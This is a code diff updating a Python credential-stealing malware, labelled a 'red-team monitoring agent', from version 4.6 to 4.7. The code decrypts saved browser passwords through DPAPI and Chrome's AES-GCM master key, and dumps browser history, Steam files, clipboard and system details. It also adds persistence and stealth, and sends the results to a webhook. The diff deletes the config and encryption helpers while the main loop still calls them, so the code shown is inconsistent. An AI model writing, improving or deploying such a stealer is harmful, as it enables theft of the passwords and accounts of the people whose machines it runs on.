@@ -1,5 +1,5 @@
 # =====================================================
-# ULTIMATE RED-TEAM MONITORING AGENT v4.6 - TXT EXFIL
+# ULTIMATE RED-TEAM MONITORING AGENT v4.7 - TXT EXFIL
 # =====================================================
 import os
 import sys
@@ -28,7 +28,13 @@ from pynput.keyboard import Listener as KeyboardListener
 import pyautogui
 import sqlite3
 import win32crypt
-from Crypto.Cipher import AES
+
+# Try to import AES (optional)
+try:
+    from Crypto.Cipher import AES
+    CRYPTO_AVAILABLE = True
+except:
+    CRYPTO_AVAILABLE = False
 
 # ================== CONFIG ==================
 CONFIG_FILE = "config.json"
@@ -57,27 +63,6 @@ BROWSER_PATHS = {
     "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), r"Vivaldi\User Data"),
     "TorBrowser": os.path.join(os.getenv('LOCALAPPDATA'), r"Tor Browser\Browser\TorBrowser\Data\Browser\Profiles"),
 }
-
-def load_config():
-    if os.path.exists(CONFIG_FILE):
-        try:
-            with open(CONFIG_FILE) as f:
-                return json.load(f)
-        except:
-            pass
-    return {"webhook": DEFAULT_WEBHOOK, "exfil_mode": "full", "encrypt": False}
-
-config = load_config()
-WEBHOOK_URL = config.get("webhook", DEFAULT_WEBHOOK)
-ENCRYPT = config.get("encrypt", False)
-
-def encrypt_data(data):
-    key = b'labagent2025x'
-    data = data.encode('utf-8')
-    enc = bytearray()
-    for i in range(len(data)):
-        enc.append(data[i] ^ key[i % len(key)])
-    return base64.b64encode(enc).decode('utf-8')
 
 def stealth_mode():
     try:
@@ -110,7 +95,7 @@ def add_persistence(script_path):
     except Exception as e:
         log(f"Persistence error: {e}")
 
-# ================== DECRYPTION HELPERS ==================
+# ================== DECRYPTION ==================
 def get_master_key(local_state_path):
     try:
         with open(local_state_path, "r", encoding="utf-8") as f:
@@ -121,18 +106,20 @@ def get_master_key(local_state_path):
         return None
 
 def decrypt_password(encrypted, master_key):
+    if not encrypted:
+        return "N/A"
     try:
-        if len(encrypted) < 15:
-            return "N/A"
-        if encrypted[:5] == b'v10' and master_key:
+        # v10 / v11 (new Chrome/Edge)
+        if encrypted.startswith(b'v1') and CRYPTO_AVAILABLE and master_key:
             iv = encrypted[3:15]
             ciphertext = encrypted[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             return cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
         else:
+            # Old DPAPI
             return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
     except:
-        return "DECRYPT_FAILED"
+        return "DECRYPT_FAILED (install pycryptodome)"
 
 # ================== STEAM STEALER ==================
 def steal_steam_data():
@@ -159,7 +146,7 @@ def steal_steam_data():
                 steam_data["files"].append(file)
     return steam_data
 
-# ================== TXT BROWSER EXFIL (PASSWORDS + HISTORY) ==================
+# ================== TXT EXFIL ==================
 def extract_browser_txt():
     txt_files = {}
     for browser, base_path in BROWSER_PATHS.items():
@@ -173,7 +160,7 @@ def extract_browser_txt():
             local_state = os.path.join(base_path, "Local State")
             master_key = get_master_key(local_state) if os.path.exists(local_state) else None
 
-            # PASSWORDS → TXT
+            # PASSWORDS
             login_db = os.path.join(profile_path, "Login Data")
             if os.path.exists(login_db):
                 try:
@@ -183,8 +170,8 @@ def extract_browser_txt():
                     content = f"=== {browser} {profile} - PASSWORDS ===\n\n"
                     for row in cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL"):
                         url, user, enc = row
-                        plain = decrypt_password(enc, master_key) if master_key else "ENCRYPTED"
-                        content += f"URL     : {url}\nUSER    : {user}\nPASS    : {plain}\n{'-'*80}\n"
+                        plain = decrypt_password(enc, master_key)
+                        content += f"URL  : {url}\nUSER : {user}\nPASS : {plain}\n{'-'*80}\n"
                     conn.close()
                     os.remove("temp_login.db")
 
@@ -194,10 +181,10 @@ def extract_browser_txt():
                     with open(fname, "rb") as f:
                         txt_files[fname] = (fname, f.read(), "text/plain")
                     os.remove(fname)
-                except:
-                    pass
+                except Exception as e:
+                    log(f"Password extraction error: {e}")
 
-            # HISTORY → TXT
+            # HISTORY
             history_db = os.path.join(profile_path, "History")
             if os.path.exists(history_db):
                 try:
@@ -221,7 +208,7 @@ def extract_browser_txt():
 
     return txt_files
 
-# ================== OTHER MODULES ==================
+# ================== OTHER MODULES (unchanged) ==================
 def get_system_info(vm_detected=False):
     return {
         "timestamp": datetime.utcnow().isoformat(),
@@ -232,7 +219,8 @@ def get_system_info(vm_detected=False):
         "os": platform.platform(),
         "active_window": win32gui.GetWindowText(win32gui.GetForegroundWindow()),
         "processes": [p.info['name'] for p in psutil.process_iter(['name'])][:30],
-        "vm_detected": vm_detected
+        "vm_detected": vm_detected,
+        "crypto_module": "AVAILABLE" if CRYPTO_AVAILABLE else "MISSING - run: pip install pycryptodome"
     }
 
 def get_clipboard():
@@ -331,7 +319,7 @@ def send_to_webhook(payload, files=None):
 
 # ================== MAIN LOOP ==================
 def main_loop(script_path):
-    log("=== AGENT v4.6 TXT EXFIL STARTED ===")
+    log("=== AGENT v4.7 TXT EXFIL STARTED ===")
     add_persistence(script_path)
     stealth_mode()
 
@@ -355,9 +343,9 @@ def main_loop(script_path):
 
             if ENCRYPT:
                 encrypted = encrypt_data(json.dumps(info, default=str))
-                payload = {"embeds": [{"title": "🛡️ AGENT v4.6 - ENCRYPTED", "description": encrypted[:1900], "color": 0x9900ff}]}
+                payload = {"embeds": [{"title": "🛡️ AGENT v4.7 - ENCRYPTED", "description": encrypted[:1900], "color": 0x9900ff}]}
             else:
-                payload = {"content": "**AGENT v4.6 REPORT - TXT FILES**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}
+                payload = {"content": "**AGENT v4.7 REPORT - TXT FILES**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}
 
             files = txt_attachments.copy()
 
